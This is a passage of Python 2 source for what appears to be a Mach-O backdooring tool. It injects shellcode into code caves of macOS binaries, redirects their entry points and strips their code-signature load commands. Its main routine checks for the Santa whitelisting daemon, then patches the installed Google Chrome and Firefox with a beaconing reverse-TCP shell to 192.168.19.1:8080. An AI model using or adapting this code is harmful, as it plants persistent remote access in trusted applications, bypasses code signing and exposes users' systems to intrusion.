                    cave_size = struct.unpack("<I", text_section['Offset'])[0] + offset - last_cmd
                    print "[*] Pre-text section 'code cave' size:", hex(cave_size)

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print "[!] Could not set shell"
                        return False

                    if len(self.shellcode) > cave_size:
                        print "[!] Shellcode is larger than available space"
                        return False

                    startingLocation = struct.unpack("<I", text_section['Offset'])[0] + offset - len(self.shellcode)

                    if LC_UNIXTREAD != {}:
                        print "[*] ...with LC_UNIXTREAD format"
                        #print 'LC_UNIXTREAD', struct.unpack("<Q", LC_UNIXTREAD['rip'])[0], struct.unpack("<Q", text_section['Address'])[0]
                        if struct.unpack("<Q", LC_UNIXTREAD['rip'])[0] - struct.unpack("<Q", text_section['Address'])[0] != 0x0:
                            self.jumpLocation = struct.unpack("<Q", LC_UNIXTREAD['rip'])[0] - struct.unpack("<Q", text_section['Address'])[0]
                    else:
                        print "[*] ...with LC_MAIN format"
                        #print struct.unpack("<Q", LC_MAIN['EntryOffset'])[0], struct.unpack("<I", text_section['Offset'])[0]
                        if struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0] != 0x0:
                            self.jumpLocation = struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0]

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print "[!] Could not set shell"
                        return False
                    #print 'shellcode:', self.shellcode.encode('hex')

                    bin.seek(startingLocation, 0)
                    bin.write(self.shellcode)
                    bin.seek(text_section['LOCAddress'], 0)
                    newAddress = struct.unpack("<Q", text_section['Address'])[0] - len(self.shellcode)
                    bin.write(struct.pack("<Q", newAddress))
                    newSize = struct.unpack("<Q", text_section['Size'])[0] + len(self.shellcode)
                    bin.write(struct.pack("<Q", newSize))
                    newOffset = struct.unpack("<I", text_section['Offset'])[0] - len(self.shellcode)
                    bin.write(struct.pack("<I", newOffset))
                    if LC_UNIXTREAD != {}:
                        bin.seek(LC_UNIXTREAD['LOCrip'], 0)
                        bin.write(struct.pack("<Q", newAddress))
                    elif LC_MAIN != {}:
                        bin.seek(LC_MAIN["LOCEntryOffset"], 0)
                        bin.write(struct.pack("<Q", newOffset))

                elif MagicNumber == '0xfeedface' and patchx86 is True:
                    print "[*] Patching x86 (i386) Mach-O Binary"
                    cave_size = struct.unpack("<I", text_section['Offset'])[0] + offset - last_cmd
                    print "[*] Pre-text section 'code cave' size:", hex(cave_size)

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print "[!] Could not set shell"
                        return False

                    if len(self.shellcode) > cave_size:
                        print "[!] Shellcode is larger than available space"
                        return False

                    #FIND Current Location
                    startingLocation = struct.unpack("<I", text_section['Offset'])[0] + offset - len(self.shellcode)

                    if LC_UNIXTREAD != {}:
                        print "[*] ...with LC_UNIXTREAD format"
                        if struct.unpack("<I", LC_UNIXTREAD['eip'])[0] - struct.unpack("<I", text_section['Address'])[0] != 0x0:
                            self.jumpLocation = struct.unpack("<I", LC_UNIXTREAD['eip'])[0] - struct.unpack("<I", text_section['Address'])[0]
                    else:
                        print "[*] ...with LC_Main format"
                        if struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0] != 0x0:
                            self.jumpLocation = struct.unpack("<Q", LC_MAIN['EntryOffset'])[0] - struct.unpack("<I", text_section['Offset'])[0]

                    resultShell = self.set_shells(MagicNumber)
                    if not resultShell:
                        print "[!] Could not set shell"
                        return False

                    bin.seek(startingLocation, 0)
                    bin.write(self.shellcode)
                    bin.seek(text_section['LOCAddress'], 0)
                    newAddress = struct.unpack("<I", text_section['Address'])[0] - len(self.shellcode)
                    bin.write(struct.pack("<I", newAddress))
                    newSize = struct.unpack("<I", text_section['Size'])[0] + len(self.shellcode)
                    bin.write(struct.pack("<I", newSize))
                    newOffset = struct.unpack("<I", text_section['Offset'])[0] - len(self.shellcode)
                    bin.write(struct.pack("<I", newOffset))
                    if LC_UNIXTREAD != {}:
                        bin.seek(LC_UNIXTREAD['LOCeip'], 0)
                        bin.write(struct.pack("<I", newAddress))
                    else:
                        bin.seek(LC_MAIN["LOCEntryOffset"], 0)
                        bin.write(struct.pack("<I", newOffset))

                else:
                    print "[!] Not patching this arch:", MagicNumber
                    continue

                if LC_CODE_SIGNATURE != {}:
                    print "[*] Removing LC_CODE_SIGNATURE command"
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    oldNumber = struct.unpack("<I", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    bin.write(struct.pack("<I", oldNumber - 1))
                    oldsize = struct.unpack("<I", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)
                    bin.write(struct.pack("<I", oldsize - 0x10))

                if LC_DYLIB_CODE_SIGN_DRS != {}:
                    print "[*] Removing LC_DYLIB_CODE_SIGN_DRS command"
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    oldNumber = struct.unpack("<I", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'], 0)
                    bin.write(struct.pack("<I", oldNumber - 1))
                    oldsize = struct.unpack("<I", bin.read(4))[0]
                    bin.seek(self.mach_hdrs[key]['LOCLoadCmds'] + 4, 0)
                    bin.write(struct.pack("<I", oldsize - 0x10))

        print "[!] Patching Complete"
        return True


if __name__ == "__main__":
    patchApps = {'/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome':True,
                 '/Applications/Firefox.app/Contents/MacOS/firefox':True,

                 }

    proclist = subprocess.Popen(['ps', 'ax'], stdout=subprocess.PIPE).stdout.readlines()

    santa_exists = False

    for proc in proclist:
        if 'santad' in proc:
            print "[!] Santa exists"
            santa_exists = True

    for app, whitelistcheck in patchApps.iteritems():
        if not os.path.isfile(app):
            print app, "is not on the target system"
            continue
        if santa_exists is True and whitelistcheck is False:
            print '[!] Cannot patch %s since whitelisting is enabled' % app
            continue
        print "\n[-]Patching:", app
        try:
            supported_file = machobin(app, None, 'beaconing_reverse_shell_tcp', '192.168.19.1', 8080, False, None, 'ALL', True, True)
            supported_file.run_this()
        except:
            pass
